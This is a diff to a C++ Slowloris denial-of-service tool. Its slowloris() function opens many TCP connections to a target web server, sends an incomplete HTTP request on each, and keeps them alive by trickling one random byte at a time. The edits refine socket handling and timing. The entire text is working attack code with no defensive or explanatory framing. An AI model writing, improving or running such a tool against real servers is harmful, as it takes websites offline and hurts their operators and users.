@@ -8,6 +8,7 @@
 #include <cstring>
 #include <chrono>
 #include <thread>
+#include <unistd.h>
 
 const int keep_alive = 1;
 int threads = 12;
@@ -32,26 +33,33 @@ class InputParser {
 
 void slowloris () {
   std::vector<int> sockets;
-  char header[] = "GET /l";
+  char header[] = "GET ";
   while (true) {
+    int open = sockets.size();
     std::chrono::milliseconds timeout(rand() % 10000 + 1);
-    if (sockets.size() < connections) {
-      for (int i = sockets.size(); i < connections; i++) {
+    if (open < connections) {
+      for (;open < connections;) {
         int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (s >= 0) {
           setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &keep_alive, sizeof(keep_alive));
           connect(s, (sockaddr*)&socket_address, sizeof(sockaddr_in));
           send(s, header, sizeof(header) - 1, 0);
           sockets.push_back(s);
+          open++;
         }
+        else std::this_thread::sleep_for(timeout);
       }
     }
-    for (int i = 0; i < sockets.size();) {
+    for (int i = 0; i < open - 1;) {
       char next_value = 'a' + rand() % 26;
       int bytes_sent = send(sockets[i], &next_value, 1, 0);
-      if (bytes_sent < 0) sockets.erase(sockets.begin() + i);
+      if (bytes_sent < 0) {
+        close(sockets[i]); 
+        sockets.erase(sockets.begin() + i);
+      }
       else i++;
     }
+    std::this_thread::sleep_for(timeout);
   }
 }
 
